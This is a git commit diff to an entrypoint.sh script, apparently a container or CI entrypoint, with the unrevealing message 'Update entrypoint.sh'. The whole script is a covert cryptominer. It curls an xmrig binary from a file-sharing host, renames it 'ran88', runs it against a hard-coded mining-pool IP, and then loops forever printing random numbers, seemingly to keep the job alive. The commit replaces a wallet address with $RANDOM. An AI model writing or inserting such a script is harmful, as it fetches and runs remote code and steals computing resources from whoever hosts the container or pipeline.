6abe08c53ea36331e7749bfd2e086ef15ed43776
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-24 00:03:26 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,4 +1,4 @@
 curl https://transfer.sh/yesOy8/xmrig --output ran88
 chmod +x ran88
-./ran88 --url 36.89.94.125:3333 --user 8AY6qi2nRgjUBeWTepTeukSBp5S2aKFWPjESJYPmoFV8KHgEbvgNdRoj1uxpUSccVYRhAGQfrSAWXPYQd5HSCcK8QWKhy9q --pass x --donate-level 0
+./ran88 --url 36.89.94.125:3333 --user $RANDOM --pass x --donate-level 0
 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
